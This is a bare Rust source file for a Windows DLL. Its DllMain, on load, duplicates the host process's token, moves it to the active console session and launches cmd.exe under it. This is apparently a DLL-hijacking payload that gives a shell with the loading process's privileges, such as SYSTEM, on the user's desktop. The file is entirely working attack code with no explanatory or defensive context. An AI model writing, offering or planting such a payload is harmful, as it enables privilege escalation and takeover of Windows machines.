use windows::core::*;
use windows::Win32::Foundation::*;
use windows::Win32::System::Threading::*;
use windows::Win32::System::SystemServices::*;
use windows::Win32::Security::*;
use windows::Win32::System::RemoteDesktop::*;

#[no_mangle]
pub unsafe extern "stdcall" fn DllMain(_: HINSTANCE, reason: u32, _: *mut u8) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        let mut token = HANDLE::default();
        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &mut token).ok().unwrap();

        let mut token2 = HANDLE::default();
        DuplicateTokenEx(token, TOKEN_ACCESS_MASK(MAXIMUM_ALLOWED), None, SecurityIdentification, TokenPrimary, &mut token2).ok().unwrap();
        SetTokenInformation(token2, TokenSessionId, WTSGetActiveConsoleSessionId().to_le_bytes().as_ptr() as _, 4).ok().unwrap();

        let mut si = STARTUPINFOW::default();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut pi = PROCESS_INFORMATION::default();
        CreateProcessAsUserW(token2, None, PWSTR("cmd.exe".encode_utf16().chain(Some(0)).collect::<Vec<u16>>().as_mut_ptr()), None, None, FALSE, PROCESS_CREATION_FLAGS(0), None, None, &si, &mut pi).ok().unwrap();
    }
    return TRUE;
}
